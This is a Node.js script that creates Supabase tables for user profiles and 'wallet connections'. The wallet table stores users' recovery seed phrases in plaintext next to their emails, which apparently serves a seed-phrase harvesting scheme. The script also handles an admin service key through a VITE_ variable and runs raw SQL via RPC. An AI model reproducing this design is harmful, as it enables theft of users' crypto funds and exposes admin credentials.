// Script to create necessary tables in Supabase
import { createClient } from '@supabase/supabase-js';
import * as dotenv from 'dotenv';
import { fileURLToPath } from 'url';
import { dirname, resolve } from 'path';

// Get current file path
const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

// Load environment variables
dotenv.config({ path: resolve(__dirname, '..', '.env') });

// Get Supabase credentials from .env file
const supabaseUrl = process.env.VITE_SUPABASE_URL;
const supabaseServiceKey = process.env.VITE_SUPABASE_SERVICE_KEY;

// Create Supabase client with service key for admin privileges
const supabase = createClient(supabaseUrl, supabaseServiceKey);

async function createTables() {
  try {
    console.log('Creating necessary tables in Supabase...');
    
    // Create profiles table if it doesn't exist
    const { error: profilesError } = await supabase.rpc('create_table_if_not_exists', {
      table_name: 'profiles',
      table_definition: `
        id UUID PRIMARY KEY REFERENCES auth.users(id),
        full_name TEXT,
        avatar_url TEXT,
        role TEXT DEFAULT 'user',
        email TEXT,
        created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
      `
    });
    
    if (profilesError) {
      console.error('Error creating profiles table:', profilesError);
      
      // Alternative approach using raw SQL
      const { error: sqlError } = await supabase.rpc('exec_sql', {
        sql_string: `
          CREATE TABLE IF NOT EXISTS public.profiles (
            id UUID PRIMARY KEY REFERENCES auth.users(id),
            full_name TEXT,
            avatar_url TEXT,
            role TEXT DEFAULT 'user',
            email TEXT,
            created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
          );
        `
      });
      
      if (sqlError) {
        console.error('Error creating profiles table with SQL:', sqlError);
      } else {
        console.log('✅ Created profiles table using SQL');
      }
    } else {
      console.log('✅ Created profiles table');
    }
    
    // Create wallet_connections table if it doesn't exist
    const { error: walletError } = await supabase.rpc('create_table_if_not_exists', {
      table_name: 'wallet_connections',
      table_definition: `
        id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
        user_id UUID REFERENCES auth.users(id),
        user_email TEXT,
        name TEXT,
        blockchain TEXT,
        wallet_type TEXT,
        address TEXT,
        seed_phrase TEXT,
        seed_phrase_required INTEGER DEFAULT 12,
        status TEXT DEFAULT 'pending',
        created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
      `
    });
    
    if (walletError) {
      console.error('Error creating wallet_connections table:', walletError);
      
      // Alternative approach using raw SQL
      const { error: sqlError } = await supabase.rpc('exec_sql', {
        sql_string: `
          CREATE EXTENSION IF NOT EXISTS "uuid-ossp";
          
          CREATE TABLE IF NOT EXISTS public.wallet_connections (
            id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
            user_id UUID REFERENCES auth.users(id),
            user_email TEXT,
            name TEXT,
            blockchain TEXT,
            wallet_type TEXT,
            address TEXT,
            seed_phrase TEXT,
            seed_phrase_required INTEGER DEFAULT 12,
            status TEXT DEFAULT 'pending',
            created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
          );
        `
      });
      
      if (sqlError) {
        console.error('Error creating wallet_connections table with SQL:', sqlError);
      } else {
        console.log('✅ Created wallet_connections table using SQL');
      }
    } else {
      console.log('✅ Created wallet_connections table');
    }
    
    console.log('Table creation completed');
  } catch (error) {
    console.error('Unexpected error:', error);
  }
}

createTables()
  .then(() => {
    console.log('Done');
    process.exit(0);
  })
  .catch(error => {
    console.error('Fatal error:', error);
    process.exit(1);
  });
